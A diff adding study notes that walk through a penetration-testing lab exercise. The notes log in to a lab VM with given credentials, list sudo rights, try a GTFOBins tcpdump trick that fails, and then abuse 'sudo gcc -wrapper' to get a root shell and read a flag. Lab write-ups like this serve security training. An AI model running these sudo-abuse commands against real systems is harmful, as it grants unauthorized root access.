@@ -1,0 +1,42 @@
+Questions 2
+Connect to VM 2 and gain a root shell by abusing a sudo misconfiguration.
+
+HINT
+Use the provided command in Listing 46 to determine which commands can be executed with sudo privileges.
+Check GTFOBins (https://gtfobins.github.io/) for instructions on exploiting the sudo permissions to escalate privileges to root.
+
+ssh joe@192.168.177.214
+Password: offsec
+
+# Check the sudo commands
+sudo -l 
+    (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/gcc
+
+
+https://gtfobins.github.io/
+
+# Lets try with the first command from start
+crontab 
+sudo crontab -l
+Sorry, user joe is not allowed to execute '/usr/bin/crontab' as root on debian-privesc.
+
+# try tcpdump
+joe@debian-privesc:~$ COMMAND='id'
+joe@debian-privesc:~$ TF=$(mktemp)
+joe@debian-privesc:~$ echo "$COMMAND" > $TF
+joe@debian-privesc:~$ chmod +x $TF
+joe@debian-privesc:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+dropped privs to root
+tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
+Maximum file limit reached: 1
+1 packet captured
+16 packets received by filter
+0 packets dropped by kernel
+compress_savefile: execlp(/tmp/tmp.oGhNT8rMkB, /dev/null) failed: Permission denied
+
+# Failed again, now we left gcc
+sudo gcc -wrapper /bin/sh,-s .
+# whoami
+root
+# cat flag.txt  
+OS{6846cc368a7a059e02c0b30aff693de1}
